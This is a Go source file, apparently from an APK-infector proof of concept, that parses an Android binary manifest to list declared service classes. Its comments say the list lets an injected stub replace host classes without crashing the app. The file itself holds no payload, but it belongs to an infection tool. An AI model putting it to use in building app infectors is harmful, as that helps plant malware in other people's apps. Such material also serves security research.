package manifest

// Read-only manifest queries.
//
// DeclaredServiceClasses exists because the dex-side patches need to know which
// classes the host declares as <service> before they can be replaced: the
// injected stub has to keep every declared component startable, and a missing
// class makes PackageManagerService skip the component (and, for a service
// referenced by the system, kills the app on start). The list is read straight
// from the binary manifest - no aapt2, no plaintext dump, no device.
//
// The parser is deliberately minimal and read-only: the chunks are walked by
// size (AXML chunks are contiguous and self-describing), the string pool is
// decoded with the same helper the patch vectors use, and the attributes of each
// <service> are resolved through the resource map exactly like the platform does.

import (
	"log"
	"os"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

// packageAttrName is the <manifest> attribute holding the package name. It is
// never resolved through the resource map: PackageParser::parsePackageSplitNames
// reads it as a plain string.
const packageAttrName = "package"

// ------------------------------------------------------------- entry point

// DeclaredServiceClasses returns the fully-qualified names of the android:name
// attributes of every <service> element in the binary manifest at
// utils.ManifestBinaryPath, in declaration order and without duplicates.
//
// A relative name (".SyncService") and a bare name ("SyncService") are both
// resolved against the manifest package, the same way PackageParser does it. The
// function does not panic on an unreadable manifest: it logs the reason and
// returns nil, so a caller can decide whether the patch is still meaningful.
func DeclaredServiceClasses() []string {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Printf("DeclaredServiceClasses: cannot read %s: %v", utils.ManifestBinaryPath, err)
		return nil
	}

	pool := parseStringPool(data)
	resIDs, _, _ := readResMap(data)

	root := firstTagStart(data)
	if root < 0 {
		log.Printf("DeclaredServiceClasses: no <manifest> root tag in %s", utils.ManifestBinaryPath)
		return nil
	}
	pkg := manifestPackageName(data, pool, root)

	// <service> elements are children of <application>, never of <manifest>
	appOff := -1
	for _, c := range childElements(data, root) {
		if elementName(pool, data, c) == applicationTagStr {
			appOff = c.startOff
			break
		}
	}
	if appOff < 0 {
		log.Printf("DeclaredServiceClasses: no <application> in %s", utils.ManifestBinaryPath)
		return nil
	}

	var out []string
	seen := map[string]bool{}
	for _, c := range childElements(data, appOff) {
		if elementName(pool, data, c) != serviceTagStr {
			continue
		}
		name, ok := findAttrByResID(data, c.startOff, resIDs, resIDName)
		if !ok {
			// a <service> without android:name is a manifest error the platform
			// rejects; there is no class to report
			log.Printf("DeclaredServiceClasses: <service> without android:name at 0x%x, skipped", c.startOff)
			continue
		}
		className := attrStringValue(pool, data, name)
		if className == "" {
			continue
		}
		if pkg != "" {
			className = resolveClassName(pkg, className)
		}
		if seen[className] {
			continue
		}
		seen[className] = true
		out = append(out, className)
	}
	return out
}

// manifestPackageName reads the package attribute of the <manifest> root tag out
// of the binary manifest. "package" is the one attribute that is not resolved
// through the resource map (PackageParser reads it as a plain string), so it is
// matched by its pool string.
func manifestPackageName(data []byte, pool *stringPool, root int) string {
	for _, a := range elementAttrs(data, root) {
		if pool.decode(data, int(a.name)) != packageAttrName {
			continue
		}
		return attrStringValue(pool, data, a)
	}
	return ""
}
